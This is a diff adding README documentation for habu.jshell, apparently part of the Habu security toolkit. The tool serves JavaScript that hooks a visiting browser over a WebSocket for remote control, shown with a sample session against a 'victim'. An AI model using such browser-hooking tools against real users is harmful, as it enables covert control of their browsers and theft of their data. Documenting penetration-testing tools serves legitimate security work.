@@ -275,6 +275,46 @@ You can get a graphical representation (needs the matplotlib package) using the 
 **Note:** The above command uses '-c' option to define that 10 connections must be created.
 
 
+habu.jshell: JavaScript Shell that uses WebSockets
+--------------------------------------------------
+This is one of the most complex commands in Habu. When you start it, binds a port (default: 3333)
+and listen for HTTP connections. If receives a connection, sends a JavaScript code that opens a
+WebSocket (https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API) that can be used
+to send commands to the connected browser.
+
+You can write the commands directly in the shell, or use plugins, that are simply external
+JavaScript files.
+
+Using habu.jshell you can completely control a web browser.
+
+**Note:** The complete documentation of the module will be separated from the main documentation,
+because this module has a lot of options and commands.
+
+.. code-block:: bash
+
+    $ habu.jshell 
+    >>> Listening on 192.168.0.10:3333. Waiting for a victim connection.
+    >>> HTTP Request received from 192.168.0.15. Sending hookjs
+    >>> Connection from 192.168.0.15
+    $ _sessions
+    0 * 192.168.0.15:33432 Mozilla/5.0 (X11; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0
+    $ _info
+    {
+        "user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0",
+        "location": "http://192.168.0.10:3333/",
+        "java-enabled": false,
+        "platform": "Linux x86_64",
+        "app-code-name": "Mozilla",
+        "app-name": "Netscape",
+        "app-version": "5.0 (X11)",
+        "cookie-enabled": true,
+        "language": "es-AR",
+        "online": true
+    }
+    $ document.location
+    http://192.168.0.10:3333/
+
+
 habu.karma: Karma API client
 ----------------------------
 Uses the Karma service (https://karma.securetia.com) to check an IP against a lot of 
